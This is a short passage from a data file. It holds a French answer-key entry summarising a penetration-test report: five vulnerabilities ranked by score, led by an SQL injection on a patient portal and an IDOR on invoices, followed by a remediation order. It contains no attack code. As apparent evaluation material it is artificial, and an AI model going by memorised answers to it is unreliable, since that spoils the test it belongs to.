    "takeaway": "1) Le rapport recense 5 vulnérabilités.\n2) Deux sont de sévérité moyenne : le XSS stocké (6,1) et l'absence d'HSTS (5,9).\n3) La priorité absolue est l'injection SQL sur le portail patient, score 9,8.\n4) La deuxième vulnérabilité la plus grave est l'IDOR sur les factures, score 8,6.\n5) La section destinée à la direction est la synthèse exécutive : risques, impacts et priorités, sans jargon technique.\n6) La deuxième ligne du plan de remédiation revient à l'IDOR, immédiatement derrière l'injection SQL dans l'ordre des scores décroissants.\nContrôle : 1 critique (9,8) + 1 élevée (8,6) + 2 moyennes (6,1 et 5,9) + 1 faible (3,1) = 5 vulnérabilités, et le classement 9,8 &gt; 8,6 &gt; 6,1 &gt; 5,9 &gt; 3,1 fixe l'ordre exact du plan de remédiation."
  }
];
